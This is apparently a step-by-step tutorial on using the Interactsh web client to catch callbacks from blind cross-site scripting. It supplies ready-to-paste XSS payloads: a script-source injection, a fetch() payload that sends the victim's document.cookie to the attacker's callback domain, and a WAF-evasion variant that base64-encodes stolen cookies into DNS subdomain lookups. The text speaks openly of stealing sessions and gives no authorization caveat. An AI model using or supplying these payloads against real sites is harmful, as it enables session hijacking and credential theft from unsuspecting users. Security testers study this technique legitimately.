To use the Interactsh Web Client, you do not need to install anything. It operates entirely within your browser to generate unique tracking addresses and catch incoming connection alerts. [1, 2] 
## Step 1: Generate Your Unique Link

   1. Open your browser and go to the official [ProjectDiscovery Interactsh Web App](https://app.interactsh.com/).
   2. Look at the top menu bar to see your automatically generated, unique subdomain string.
   3. Click the Copy button next to it (it will look like c123xpt20v...oast.fun or *.interact.sh). [3, 4, 5] 

------------------------------
## Step 2: Craft and Inject Your XSS Payload
Take your unique copied address and plug it into a standard HTML payload vector. [6] 
Basic Alert Payload:

"><script src="http://YOUR_COPIED_DOMAIN"></script>

Advanced Data-Stealing Payload:
If you want to actively steal the victim's session cookies or configuration variables via the callback, append the document data straight to your URL query path: [7, 8] 

"><script>fetch('http://YOUR_COPIED_DOMAIN/log?cookie='+document.cookie)</script>

------------------------------
## Step 3: Monitor Live Callbacks
Leave the Interactsh web tab open in your browser. When the target web application runs your code, it forces the browser or server backend to call your domain. [6, 9] 
The client interface will instantly log and parse the connection:

* DNS Tab: Verifies exactly when the host looked up your tracking link.
* HTTP Tab: Inspects the request to view Cookies, header details, custom paths, and the client browser type. [6] 

------------------------------
## Pro-Tip: Data Exfiltration via Subdomains
If a rigid Web Application Firewall (WAF) blocks parameters or paths like /log?cookie=, you can dynamically inject leaked data directly into a subdomain lookup to extract it safely via raw DNS logs: [8, 10] 

"><script>
  var encoded = btoa(document.cookie).replace(/[^a-zA-Z0-9]/g, '');
  var img = new Image();
  img.src = 'http://' + encoded + '.YOUR_COPIED_DOMAIN';
</script>

When this runs, the victim's base64-encoded cookie strings will display directly inside the DNS subdomains section on your dashboard.
